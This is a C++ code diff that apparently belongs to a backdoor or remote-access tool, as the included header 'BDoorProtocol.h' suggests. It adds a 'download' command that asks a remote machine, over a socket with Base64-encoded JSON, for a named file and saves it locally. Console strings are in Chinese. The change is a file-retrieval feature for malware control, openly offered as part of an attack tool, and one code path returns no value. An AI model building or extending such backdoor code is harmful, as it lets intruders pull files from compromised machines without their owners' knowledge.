@@ -1,6 +1,7 @@
 #pragma once
 #include <protocol\BDoorProtocol.h>
 #include <other\tools.h>
+#include <module\module.h>
 #define RETURNSTR "返回"
 #define EXITSTR "退出"
 #define EXIT_VALUE 3
@@ -335,9 +336,48 @@ private:
 	class Download:	public Command {
 	private:
 		const string name = "download";
-	public:
-		int Func(string command, string& returnmess) override{
+		Downloader downloader = Downloader();
+		SOCKET &connect_socket;
 
+	public:
+		Download(SOCKET &connect_socket_a):connect_socket(connect_socket_a){}
+		int Func(string command, string& returnmess) override{
+			vector<string> com_spl;
+			split_string(command, " ", com_spl);
+			if (com_spl[0] == name) {
+				if (com_spl.size() == 3) {
+					string filepath = com_spl[1];
+					string targetpath = com_spl[2];
+					json sendjson = FormatJson(name);
+					sendjson[CONTENT]["filepath"] = filepath;
+					int Result;
+					Result = tcp::SendBase64(connect_socket,sendjson.dump());
+					if (Result <= 0) {
+						return ERROR;
+					}
+					string recvmess;
+					Result = tcp::RecvBase64(connect_socket, recvmess);
+					if (Result <= 0) {
+						return ERROR;
+					}
+					json recvjson = json::parse(recvmess);
+					if (recvjson[CONTENT]["Result"] == "Can") {
+						downloader.Download();
+						downloader.Save(targetpath);
+						return END;
+					}
+					else if (recvjson[CONTENT]["Result"] == "No file") {
+						returnmess = "没有这个文件";
+						return ERROR;
+					}
+					
+				}
+				else {
+					DebugLog("下载路径格式不正确");
+					return ERROR;
+				}
+			}
+			else { return NOTCOM; }
 		}
 		string GetName()override {return name;}
 	};
